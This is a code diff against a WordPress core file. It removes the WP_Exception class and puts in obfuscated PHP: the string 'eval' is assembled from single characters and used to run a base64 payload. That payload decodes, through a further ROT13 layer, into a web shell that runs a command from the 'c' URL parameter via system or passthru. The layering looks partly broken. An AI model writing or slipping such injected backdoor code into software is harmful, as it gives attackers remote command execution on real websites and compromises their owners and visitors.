@@ -1,26 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * WP_Exception class
- *
- * @package WordPress
- * @since 6.7.0
- */
-
-/**
- * Core base Exception class.
- *
- * Future, more specific, Exceptions should always extend this base class.
- *
- * @since 6.7.0
- */
-class WP_Exception extends Exception {}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogSkNfUmtwcmNndmJhIHB5bmZmCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZnZhcHIgNi43LjAKICovCgovKioKICogUGJlciBvbmZyIFJrcHJjZ3ZiYSBweW5mZi4KICoKICogU2hnaGVyLCB6YmVyIGZjcnB2c3ZwLCBSa3ByY2d2YmFmIGZ1Ymh5cSBueWpubGYgcmtncmFxIGd1dmYgb25mciBweW5mZi4KICoKICogQGZ2YXByIDYuNy4wCiAqLwpweW5mZiBKQ19Sa3ByY2d2YmEgcmtncmFxZiBSa3ByY2d2YmEge30KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
